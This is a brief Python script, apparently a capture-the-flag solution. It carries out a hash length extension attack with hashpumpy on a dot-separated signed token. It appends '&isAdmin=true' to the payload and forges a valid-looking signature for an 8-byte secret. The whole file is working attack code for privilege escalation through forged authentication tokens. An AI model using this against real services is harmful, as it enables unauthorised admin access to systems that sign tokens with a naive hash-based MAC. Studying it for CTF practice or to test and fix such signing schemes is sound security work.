from base64 import b64encode, b64decode
from urllib import quote, unquote
import hashpumpy

def hashattack(s):
    s = unquote(s)
    header, payload, signature = s.split(".")
    #signature_new, payload_new = hashpumpy.hashpump(b64decode(signature), b64decode(header) + "." + b64decode(payload), "&isAdmin=true", 8)
    signature_new, payload_new = hashpumpy.hashpump(b64decode(signature), b64decode(payload), "&isAdmin=true", 8)
    return quote(header + "." + b64encode(payload_new) + "." + b64encode(signature_new))

